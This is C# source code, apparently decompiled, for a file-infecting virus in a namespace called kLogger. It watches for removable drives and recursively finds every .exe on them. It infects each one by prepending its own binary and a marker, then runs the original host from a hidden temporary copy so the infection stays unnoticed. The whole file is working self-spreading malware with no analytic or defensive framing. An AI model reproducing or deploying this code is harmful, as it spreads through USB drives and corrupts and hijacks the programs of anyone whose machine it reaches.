using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text.RegularExpressions;
using System.Threading;

namespace kLogger;

public class Replication
{
	private const int INFECTIONBUFFERSIZE = 256;

	private const int BUFFERSIZE = 8192;

	private const int BIGBUFFERSIZE = 5242880;

	private const string TEMPFILENAME = "temp.zzzz";

	private readonly byte[] InfectionCODE = new byte[256];

	public Replication()
	{
		for (int i = 0; i < 256; i++)
		{
			InfectionCODE[i] = (byte)i;
		}
	}

	public void DetectRemovableDrive()
	{
		DriveInfo[] array = null;
		int num = 0;
		while (true)
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			if (array == null || (array != null && array.Count() != drives.Count()) || num > 10)
			{
				array = drives;
				num = 0;
				DriveInfo[] array2 = drives;
				foreach (DriveInfo driveInfo in array2)
				{
					if (driveInfo.DriveType != DriveType.Removable || !driveInfo.IsReady)
					{
						continue;
					}
					try
					{
						bool flag = false;
						string[] files = Directory.GetFiles(driveInfo.Name);
						string[] array3 = files;
						foreach (string text in array3)
						{
							if (text.EndsWith(".EXE") || text.EndsWith(".exe"))
							{
								File.SetAttributes(text, FileAttributes.Normal);
								InfectEXE(text);
								flag = true;
							}
						}
						if (!flag)
						{
							FindEXERecurisvely(new DirectoryInfo(driveInfo.Name));
						}
					}
					catch (Exception)
					{
						Thread.Sleep(5000);
					}
				}
			}
			else
			{
				num++;
				Thread.Sleep(6000);
			}
		}
	}

	private void FindEXERecurisvely(DirectoryInfo dirInfo)
	{
		DirectoryInfo[] directories = dirInfo.GetDirectories();
		foreach (DirectoryInfo dirInfo2 in directories)
		{
			FindEXERecurisvely(dirInfo2);
		}
		FileInfo[] files = dirInfo.GetFiles();
		foreach (FileInfo fileInfo in files)
		{
			if (fileInfo.FullName.EndsWith(".EXE") || fileInfo.FullName.EndsWith(".exe"))
			{
				fileInfo.Attributes = FileAttributes.Normal;
				InfectEXE(fileInfo.FullName);
			}
		}
	}

	public bool BreakAction(string args)
	{
		try
		{
			Thread.Sleep(200);
			string[] array = Regex.Split(args, "\r\n");
			string text = array[0];
			string sourceFileName = array[1].Replace("%20", " ");
			string text2 = array[2].Replace("%20", " ");
			File.SetAttributes(text2, FileAttributes.Normal);
			File.Delete(text2);
			File.Move(sourceFileName, text2);
			File.SetAttributes(text2, FileAttributes.Normal);
			Process process = new Process();
			process.StartInfo.FileName = text2;
			process.Start();
			if (text == "die")
			{
				return false;
			}
		}
		catch
		{
		}
		return true;
	}

	public bool IsThisTrojanHorse(string thisFile)
	{
		FileStream fileStream = null;
		bool flag = false;
		try
		{
			fileStream = File.OpenRead(thisFile);
			byte[] buffer = new byte[256];
			int num;
			do
			{
				num = fileStream.Read(buffer, 0, 256);
				flag = InfectionCheck(buffer);
			}
			while (num > 0 && !flag);
			return flag;
		}
		catch
		{
			return flag;
		}
	}

	private void InfectEXE(string file)
	{
		file.Substring(file.LastIndexOf("\\") + 1);
		string text = file.Substring(0, file.LastIndexOf("\\") + 1) + "temp.zzzz";
		FileStream fileStream = null;
		FileStream fileStream2 = null;
		FileStream fileStream3 = null;
		try
		{
			fileStream = File.Open(file, FileMode.Open, FileAccess.Read);
			fileStream2 = File.OpenRead(Assembly.GetExecutingAssembly().Location);
			byte[] buffer = new byte[256];
			byte[] buffer2 = new byte[5242880];
			if (fileStream.Length > 524288000L)
			{
				fileStream.Close();
				fileStream2.Close();
				return;
			}
			if (fileStream.Length > fileStream2.Length)
			{
				fileStream.Seek(fileStream2.Length, SeekOrigin.Begin);
				fileStream.Read(buffer, 0, 256);
				if (InfectionCheck(buffer))
				{
					fileStream.Close();
					fileStream2.Close();
					return;
				}
			}
			fileStream.Seek(0L, SeekOrigin.Begin);
			if (File.Exists(text))
			{
				File.Delete(text);
			}
			fileStream3 = File.Create(text);
			File.SetAttributes(text, FileAttributes.Hidden);
			int num;
			do
			{
				num = fileStream2.Read(buffer2, 0, 5242880);
				fileStream3.Write(buffer2, 0, num);
			}
			while (num > 0);
			fileStream2.Close();
			fileStream3.Write(InfectionCODE, 0, 256);
			do
			{
				num = fileStream.Read(buffer2, 0, 5242880);
				fileStream3.Write(buffer2, 0, num);
			}
			while (num > 0);
			fileStream.Close();
			fileStream3.Close();
			File.Delete(file);
			File.Move(text, file);
			File.SetAttributes(file, FileAttributes.Normal);
		}
		catch (Exception)
		{
		}
	}

	public void RetieveEXE(string thisFile, string virusName)
	{
		string text = thisFile.Substring(0, thisFile.LastIndexOf("\\") + 1) + "temp.zzzz";
		byte[] buffer = new byte[256];
		bool flag;
		string text2 = ((!(flag = SystemAlreadyInfected(virusName))) ? (Path.GetTempPath() + virusName + ".exe") : (Path.GetTempPath() + virusName + "2.exe"));
		try
		{
			FileStream fileStream = File.OpenRead(thisFile);
			if (File.Exists(text))
			{
				File.Delete(text);
			}
			FileStream fileStream2 = File.Create(text);
			File.SetAttributes(text, FileAttributes.Hidden);
			bool flag2 = false;
			int num;
			do
			{
				num = fileStream.Read(buffer, 0, 256);
				if (!(flag2 = InfectionCheck(buffer)))
				{
					fileStream2.Write(buffer, 0, num);
				}
			}
			while (num > 0 && !flag2);
			fileStream2.Close();
			File.Copy(text, text2, overwrite: true);
			File.Delete(text);
			File.SetAttributes(text2, FileAttributes.Normal);
			buffer = new byte[5242880];
			fileStream2 = File.Create(text);
			File.SetAttributes(text, FileAttributes.Hidden);
			do
			{
				num = fileStream.Read(buffer, 0, 5242880);
				fileStream2.Write(buffer, 0, num);
			}
			while (num > 0);
			fileStream2.Close();
			fileStream.Close();
			Process process = new Process();
			process.StartInfo.FileName = text2;
			if (flag)
			{
				process.StartInfo.Arguments = "die\r\n" + text.Replace(" ", "%20") + "\r\n" + thisFile.Replace(" ", "%20");
			}
			else
			{
				process.StartInfo.Arguments = "move\r\n" + text.Replace(" ", "%20") + "\r\n" + thisFile.Replace(" ", "%20");
			}
			process.Start();
		}
		catch (Exception)
		{
		}
	}

	private bool SystemAlreadyInfected(string virusName)
	{
		Process[] processesByName = Process.GetProcessesByName(virusName);
		if (processesByName != null && processesByName.Length > 0)
		{
			return true;
		}
		return false;
	}

	private bool InfectionCheck(byte[] buffer)
	{
		if (buffer.Length != InfectionCODE.Length)
		{
			return false;
		}
		int num = 0;
		while (true)
		{
			if (num < 256)
			{
				if (buffer[num] != InfectionCODE[num])
				{
					break;
				}
				num++;
				continue;
			}
			return true;
		}
		return false;
	}
}
